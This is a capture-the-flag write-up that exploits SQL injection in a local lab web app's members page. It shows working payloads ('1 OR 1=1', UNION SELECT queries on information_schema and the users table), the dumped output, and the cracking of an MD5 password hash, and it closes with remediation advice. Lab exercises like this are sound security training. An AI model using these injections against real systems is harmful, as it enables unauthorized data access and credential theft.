When navigating to the Members page http://localhost:8080/index.php?page=member we are met with an input field.

We can try to send `1 OR 1=1` to check if we could do an SQL Injection attack, and we see that we can indeed proceed when this is returned on the page:

```
ID: 1 OR 1=1 
First name: one
Surname : me

ID: 1 OR 1=1 
First name: two
Surname : me

ID: 1 OR 1=1 
First name: three
Surname : me

ID: 1 OR 1=1 
First name: Flag
Surname : GetThe
```

Now that we know that it is vulnerable let's try getting some more information about the database:

`1 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database() --`

This shows us that there are multiple columns that we can look into. Upon further research, we spot a user named `Flag` and we try to find his ID: 

`1 UNION SELECT user_id, first_name FROM users --`

We are now going to try to find some informations in the `Commentaire` and `countersign` columns: 

`1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --`

This gives us another hint:

```
ID: 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 -- 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

Let's follow the instructions:
 - Trying to decode `5ff9d0165b4f92b14994e5c685cdce28` we find that it's MD5 and decrypted we get `FortyTwo`
 - Lower all the chars -> `fortytwo`
 - SH256 on it -> `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

Here is our flag !

To remediate this vulnerability, the application should:
 - Use parameterized queries or prepared statements instead of directly concatenating user input into SQL queries
 - Implement input validation to reject suspicious inputs containing SQL syntax
 - Apply the principle of least privilege by using a database user with only the necessary permissions
 - Implement proper error handling that doesn't expose database details to users